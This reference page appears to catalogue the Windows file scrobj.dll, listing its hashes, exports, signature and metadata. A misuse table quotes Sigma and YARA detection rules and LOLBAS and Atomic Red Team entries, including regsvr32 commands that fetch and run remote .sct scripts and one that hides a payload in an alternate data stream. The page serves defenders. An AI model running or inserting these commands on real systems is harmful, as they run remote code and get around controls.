---
title: scrobj.dll | Windows  Script Component Runtime
excerpt: What is scrobj.dll?
---

# scrobj.dll 

* File Path: `C:\Windows\system32\scrobj.dll`
* Description: Windows  Script Component Runtime

## Hashes

Type | Hash
-- | --
MD5 | `2B1FCEEF335007A30C9BF2B77566D02F`
SHA1 | `A1197ECCAE94A93FBE0A131C36CA70E7A9E0D346`
SHA256 | `5770BF8FB1CD042EA5299CDB34AB174117C351A4FB81C1DC9558CE095B0327C3`
SHA384 | `F55205CE87D477F64AC0AF5EDBBD218FE302558BF33033A5E5E1A0FA0ECA45B7BE1FB42BF77821C205120F2E3F35E6CD`
SHA512 | `92D4BED5F6D8D14A8F2F3BE60D1EAFF1E029C02D438DC31FEACA79E0ACB17FC673E18B06B89CA28F5B8E7E7787CFE86AA91DFCF12C11D05FD49B9D22B4A90915`
SSDEEP | `3072:umDHKLPo42/xDvZdNjmEUZpXJhkOYamC7EIuLWcayiFIKojm:BqLPo42ZTZdNSEUZpXfkOYamC7z6i6t`
IMP | `C928D4D30D6B6FC0A3B011AA381044CA`
PESHA1 | `43C7E4FF82EDBF6ECD5B23AF9B139CB87F177432`
PE256 | `5020B1BFF56D76DE3180D944264D02CADEFD98FC4BD2C604D8480CA9F2FA2B08`

## DLL Exports:

Function Name | Ordinal | Type
-- | -- | --
`DllUnregisterServer` | 10 | Exported Function
`DllRegisterServerExW` | 9 | Exported Function
`DllUnregisterServerEx` | 11 | Exported Function
`GenerateTypeLibW` | 2 | Exported Function
`GenerateTypeLib` | 1 | Exported Function
`DllRegisterServerExA` | 8 | Exported Function
`DllGetClassObject` | 4 | Exported Function
`DllCanUnloadNow` | 3 | Exported Function
`DllInstall` | 5 | Exported Function
`DllRegisterServerEx` | 7 | Exported Function
`DllRegisterServer` | 6 | Exported Function


## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: scrobj.dll.mui
* Product Name: Microsoft  Windows  Script Component Runtime
* Company Name: Microsoft Corporation
* File Version: 5.812.10240.16384
* Product Version: 5.812.10240.16384
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/67
* VirusTotal Link: https://www.virustotal.com/gui/file/5770bf8fb1cd042ea5299cdb34ab174117c351a4fb81c1dc9558ce095b0327c3/detection/


## Possible Misuse

*The following table contains possible examples of `scrobj.dll` being misused. While `scrobj.dll` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_apt_empiremonkey.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_empiremonkey.yml) | `- '*/i:%APPDATA%\logs.txt scrobj.dll'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_regsvr32_anomalies.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_regsvr32_anomalies.yml) | `- '*/i:http* scrobj.dll'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_regsvr32_anomalies.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_regsvr32_anomalies.yml) | `- '*/i:ftp* scrobj.dll'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml) | `- Command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmstp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml) | `Description: Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmstp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml) | `Description: Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Infdefaultinstall.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml) | `Description: Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Regsvr32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml) | `- Command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Regsvr32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml) | `Description: Execute the specified remote .SCT script with scrobj.dll.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Regsvr32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml) | `- Command: regsvr32.exe /s /u /i:file.sct scrobj.dll` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Regsvr32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml) | `Description: Execute the specified local .SCT script with scrobj.dll.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Advpack.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml) | `Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Advpack.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml) | `Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Ieadvpack.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml) | `Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Ieadvpack.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml) | `Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Setupapi.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml) | `Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syssetup.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml) | `Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [problem_report.md](https://github.com/redcanaryco/atomic-red-team/blob/master/.github/ISSUE_TEMPLATE/problem_report.md) | e.g. Run `regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll` | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.010.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md) | #{regsvr32path}\#{regsvr32name} /s /u /i:#{filename} scrobj.dll | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.010.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md) | #{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [testing.md](https://github.com/redcanaryco/atomic-red-team/blob/master/docs/testing.md) | regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [testing.md](https://github.com/redcanaryco/atomic-red-team/blob/master/docs/testing.md) | - You may observe the scrobj.dll loading on Windows. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_muddywater.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_muddywater.yar) | $x1 = "%11%\\scrobj.dll,NI,c:" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [crime_cobaltgang.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/crime_cobaltgang.yar) | $x6 = "scrobj.dll','********" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)



MIT License. Copyright (c) 2020 Strontic.


